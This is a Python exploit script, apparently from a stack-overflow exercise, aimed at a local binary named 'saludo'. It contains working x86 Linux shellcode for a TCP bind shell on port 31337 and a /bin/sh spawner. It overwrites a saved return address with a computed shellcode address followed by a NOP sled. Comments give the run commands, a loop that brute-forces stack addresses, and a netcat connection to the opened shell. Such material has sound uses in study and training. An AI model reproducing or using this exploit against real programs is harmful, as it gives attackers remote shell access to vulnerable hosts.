#! /usr/bin/env python

import sys

from struct import pack

# TERM 1 $ ./saludo-exploit.py FFFFCE00 | ./saludo      # enter -> rock!!
# TERM 1 $ for i in $(seq $(./h2d.py 0xffffcd00) $(./h2d.py 0xffffcf00)); do echo $(./d2h.py $i); ./saludo-exploit.py $(./d2h.py $i) | ./saludo; done   # enter -> rock!!
# TERM 2 $ netcat localhost 31337                       # enter -> rock!!

# tcp bind shell
PORT = "\x7a\x69" # HL

tcpbindshell  = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
tcpbindshell += "\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89"
tcpbindshell += "\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52"
tcpbindshell += "\x66\x68"+PORT+"\x66\x53\x89\xe1\x6a\x10"
tcpbindshell += "\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04"
tcpbindshell += "\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
tcpbindshell += "\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"
tcpbindshell += "\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
tcpbindshell += "\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68"
tcpbindshell += "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
tcpbindshell += "\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";

# spawn a shell
shell  = "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
shell += "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
shell += "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

shellcode = tcpbindshell
# shellcode = shell

ebp_main = int(sys.argv[1], 16)
# ebp_main = int(sys.argv[1], 10)
ebp = (ebp_main & 0xfffffff0) - 2 * 0x4

nombre_addr = ebp - 0x58
shellcode_addr = nombre_addr + 80 + 4 * 3 + 32

exploit  = "A" * 80 # nombre
exploit += "B" * 4  # ebp-0x8
exploit += "C" * 4  # ebp-0x4
exploit += "D" * 4  # ebp
exploit += pack("<I", shellcode_addr)
exploit += "\x90" * 0x50 # padding
exploit += shellcode

sys.stdout.write(exploit)
